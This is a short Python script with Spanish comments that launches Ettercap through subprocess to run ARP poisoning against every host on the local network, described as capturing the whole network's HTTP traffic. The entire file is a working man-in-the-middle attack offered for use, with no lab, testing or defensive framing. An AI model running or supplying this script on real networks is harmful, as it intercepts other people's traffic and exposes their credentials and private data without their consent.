import subprocess

# Comando para capturar tráfico HTTP de toda la red
ettercap_console = "sudo ettercap -T -q -M arp:remote // //"

try:
    # Ejecutar Ettercap en segundo plano
    process = subprocess.Popen(ettercap_console, shell=True)
    
    print("[INFO] Ettercap ha sido iniciado en toda la red.")
    
    # Mantener el script corriendo o esperar a que Ettercap termine
    process.wait()

except Exception as e:
    print(f"[ERROR] No se pudo iniciar Ettercap: {e}")